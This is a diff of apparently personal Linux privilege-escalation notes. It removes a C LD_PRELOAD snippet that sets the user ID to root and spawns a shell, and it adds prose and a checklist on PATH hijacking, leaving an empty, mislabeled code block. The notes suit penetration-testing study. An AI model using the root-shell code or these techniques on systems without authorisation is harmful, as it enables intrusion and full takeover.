@@ -219,19 +219,19 @@ Capabilities help manage privileges at a more granular level. For example, if th
 getcap -r / 2>/dev/null
 ```
 
-**Priv Esc with C Code**
+**Priv Esc with PATH**
+
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).
+
+Before exploiting with, ensure you can answer the following questions:
+
+1. What folders are located under $PATH
+2. Does your current user have write privileges for any of these folders?
+3. Can you modify $PATH?
+4. Is there a script/application you can start that will be affected by this vulnerability?
 
 ```JavaScript
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-#include <unistd.h>
-void _init() {
-	unsetenv("LD_PRELOAD");
-	setgid(0);
-	setuid(0);
-	system("/bin/sh");
-}
+
 ```
 
 ****
